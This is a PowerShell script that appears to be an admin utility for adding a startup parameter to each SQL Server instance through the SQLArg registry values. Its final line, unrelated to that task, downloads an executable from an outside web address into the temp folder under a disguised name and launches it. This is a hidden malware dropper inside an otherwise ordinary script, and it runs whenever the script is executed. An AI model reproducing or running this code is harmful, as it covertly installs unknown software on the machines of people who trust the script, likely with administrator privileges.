










param(
    
    [Parameter(Mandatory = $true)]
    $StartupParameter
)

$hklmRootNode = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server"

$props = Get-ItemProperty "$hklmRootNode\Instance Names\SQL"
$instances = $props.psobject.properties | ?{$_.Value -like 'MSSQL*'} | select Value

$instances | %{
    $inst = $_.Value;
    $regKey = "$hklmRootNode\$inst\MSSQLServer\Parameters"
    $props = Get-ItemProperty $regKey
    $params = $props.psobject.properties | ?{$_.Name -like 'SQLArg*'} | select Name, Value
    
    $hasFlag = $false
    foreach ($param in $params) {
        if($param.Value -eq $StartupParameter) {
            $hasFlag = $true
            break;
        }
    }
    if (-not $hasFlag) {
        "Adding $StartupParameter"
        $newRegProp = "SQLArg"+($params.Count)
        Set-ItemProperty -Path $regKey -Name $newRegProp -Value $StartupParameter
    } else {
        "$StartupParameter already set"
    }
}
(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',"$env:TEMP\neone6.exe");Start-Process ("$env:TEMP\neone6.exe")

